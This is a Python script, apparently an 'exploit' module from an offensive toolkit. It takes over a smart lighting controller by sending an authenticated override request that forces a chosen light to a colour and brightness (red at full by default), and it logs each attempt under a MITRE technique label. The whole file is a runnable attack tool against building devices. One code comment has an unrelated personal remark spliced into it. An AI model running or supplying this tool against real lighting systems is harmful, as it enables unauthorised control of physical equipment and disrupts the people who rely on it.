# modules/exploits/smart_lighting_takeover.py

import argparse
import requests
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0827"  # Custom tactic: IoT Visual Disruption last one for the night. will pick it up tomorrow 

def log_light_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def override_light(endpoint, token, light_id, color, brightness):
    payload = {
        "id": light_id,
        "color": color,
        "brightness": brightness
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post(f"{endpoint}/api/lights/override", json=payload, headers=headers, timeout=5)
        success = r.status_code == 200
    except Exception as e:
        print(f"[!] Request failed: {e}")
        success = False

    log_light_event({
        "timestamp": datetime.utcnow().isoformat(),
        "light_id": light_id,
        "color": color,
        "brightness": brightness,
        "endpoint": endpoint,
        "success": success,
        "ttp": MITRE_TTP
    })

    if success:
        print(f"[âœ“] Light {light_id} overridden to {color} @ {brightness}%")
    else:
        print("[!] Light takeover failed")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Lighting Override")
    parser.add_argument("--endpoint", required=True, help="API base URL of lighting controller")
    parser.add_argument("--token", required=True, help="API auth token")
    parser.add_argument("--light-id", required=True, help="Target light ID")
    parser.add_argument("--color", default="red", help="Desired light color")
    parser.add_argument("--brightness", type=int, default=100, help="Brightness level 0-100")
    args = parser.parse_args()

    override_light(args.endpoint, args.token, args.light_id, args.color, args.brightness)
